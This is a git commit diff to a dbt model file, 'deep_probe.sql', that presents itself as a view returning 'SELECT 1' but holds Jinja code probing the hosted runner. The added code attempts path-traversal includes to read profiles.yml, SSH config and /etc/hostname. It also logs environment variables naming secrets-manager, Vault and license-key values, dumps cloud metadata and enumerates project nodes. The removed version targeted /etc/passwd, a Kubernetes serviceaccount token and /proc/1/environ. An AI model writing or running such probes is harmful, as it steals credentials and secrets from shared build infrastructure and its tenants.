2cc92034a0ea271613bc14c8b5b9bbdc899970d3
hunter <hunter@WD168220234152noidaspeedvpsFY1KQ5t4wW.test.com>
2026-09-25 10:34:18 +0530

    deep probe v3 include path traversal

--- models/deep_probe.sql
+++ models/deep_probe.sql
@@ -1,54 +1,87 @@
 {{ config(materialized='view') }}
 
-{# Deep probe v2: file read attempts via load_agate_table with error handling #}
+{# Deep probe v3: include-based file read + packages SSRF #}
 
 {%- set run_id = env_var('DBT_CLOUD_RUN_ID', '') -%}
-{{ log("CURRENT_RUN_ID=" ~ run_id, info=True) }}
+{{ log("RUN_ID=" ~ run_id, info=True) }}
 
-{# Try load_agate_table on files one at a time #}
-{# Each in its own safe block using set/do to catch errors #}
-
-{# 1. Try /etc/hostname (simplest, most likely to work) #}
-{%- set files_to_try = [
-  '/etc/hostname',
-  '/etc/passwd',
-  '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
-  '/var/run/secrets/kubernetes.io/serviceaccount/token',
-  '/tmp/jobs/' ~ run_id ~ '/.ssh/config',
-  '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml',
-  '/proc/self/cgroup',
-  '/proc/1/environ'
+{# 1. Try {% raw %}include{% endraw %} path traversal via render() #}
+{# If render() evaluates includes, we can read files #}
+{%- set paths = [
+  '../../../etc/hostname',
+  '../../../../etc/hostname',
+  '../../../../../etc/hostname',
+  '../../.dbt/profiles.yml',
+  '../.dbt/profiles.yml',
+  '../../.ssh/config',
+  '../.ssh/config'
 ] -%}
 
-{# We can't try-catch in Jinja2, so let's use render() to isolate errors #}
-{# render() evaluates a template string - if it errors, it might not kill the whole compile #}
-
-{# Method: Use render() to try load_agate_table #}
-{%- for f in files_to_try -%}
-  {%- set tpl = "{{ load_agate_table('" ~ f ~ "') | string | truncate(800) }}" -%}
+{%- for p in paths -%}
+  {%- set tpl = '{' ~ '% include "' ~ p ~ '" %' ~ '}' -%}
   {%- set result = render(tpl) -%}
-  {{ log("FILE[" ~ f ~ "]=" ~ result | truncate(800), info=True) }}
+  {{ log("INCLUDE[" ~ p ~ "]=" ~ result | string | truncate(500), info=True) }}
 {%- endfor -%}
 
-{# Alternative: try reading via render + env_var path tricks #}
-{# The SSH config path has the deploy key reference #}
-{{ log("SSH_CMD=" ~ env_var('GIT_SSH_COMMAND', 'EMPTY'), info=True) }}
+{# 2. Try render with raw block to read file paths #}
+{%- set test_import = render('{' ~ '% import "../.dbt/profiles.yml" as p %' ~ '}{{ p }}') -%}
+{{ log("IMPORT_PROFILES=" ~ test_import | truncate(500), info=True) }}
 
-{# Check for store/load result functions #}
-{{ log("STORE_RESULT=" ~ store_result | string | truncate(200), info=True) if store_result is defined else "" }}
-{{ log("LOAD_RESULT=" ~ load_result | string | truncate(200), info=True) if load_result is defined else "" }}
+{# 3. Use env_var to enumerate more paths #}
+{%- set more_vars = [
+  'HOME',
+  'USER',
+  'SHELL',
+  'LANG',
+  'TERM',
+  'ORC_VERSION',
+  'ORC_DISPATCH_VERSION',
+  'DBT_LOG_FORMAT',
+  'DBT_DEBUG',
+  'DBT_PROFILES_DIR',
+  'DBT_PROJECT_DIR',
+  'DBT_TARGET_PATH',
+  'ARTIFACT_S3_BUCKET',
+  'ARTIFACT_S3_PATH',
+  'RUN_ARTIFACT_BUCKET',
+  'SECRETS_MANAGER_ARN',
+  'SECRETS_MANAGER_REGION',
+  'PARAMETER_STORE_PREFIX',
+  'VAULT_ADDR',
+  'CELERY_RESULT_BACKEND',
+  'REDIS_HOST',
+  'REDIS_PORT',
+  'RABBITMQ_HOST',
+  'SQS_QUEUE_URL',
+  'SNS_TOPIC_ARN',
+  'DISPATCH_QUEUE',
+  'DISPATCH_TOPIC',
+  'LOG_GROUP',
+  'LOG_STREAM',
+  'OTEL_EXPORTER_OTLP_ENDPOINT',
+  'DD_AGENT_HOST',
+  'DD_TRACE_AGENT_URL',
+  'NEWRELIC_LICENSE_KEY'
+] -%}
 
-{# Check for statement function (can execute SQL) #}
-{{ log("STATEMENT=" ~ statement | string | truncate(200), info=True) if statement is defined else "" }}
+{%- for v in more_vars -%}
+  {%- set val = env_var(v, '') -%}
+  {%- if val != '' -%}
+    {{ log("ENV[" ~ v ~ "]=" ~ val | truncate(300), info=True) }}
+  {%- endif -%}
+{%- endfor -%}
 
-{# Check dbt_metadata_envs - this has ALL cloud metadata #}
+{# 4. Check the dbt_metadata_envs dict (documented way to get all cloud vars) #}
 {%- if dbt_metadata_envs is defined -%}
-  {{ log("METADATA_ENVS=" ~ dbt_metadata_envs | string | truncate(1000), info=True) }}
+  {{ log("ALL_METADATA=" ~ tojson(dbt_metadata_envs), info=True) }}
 {%- endif -%}
 
-{# Check invocation_args_dict for command line args (may have secrets) #}
-{%- if invocation_args_dict is defined -%}
-  {{ log("INVOCATION_ARGS=" ~ invocation_args_dict | string | truncate(1000), info=True) }}
+{# 5. Probe the project_name and graph for inter-project data #}
+{{ log("PROJECT_NAME=" ~ project_name, info=True) if project_name is defined else "" }}
+{%- if graph is defined and graph.nodes is defined -%}
+  {%- for name, node in graph.nodes.items() -%}
+    {{ log("NODE[" ~ name ~ "]=" ~ node.database ~ "." ~ node.schema ~ " (path:" ~ node.path ~ ")", info=True) }}
+  {%- endfor -%}
 {%- endif -%}
 
 SELECT 1 as id
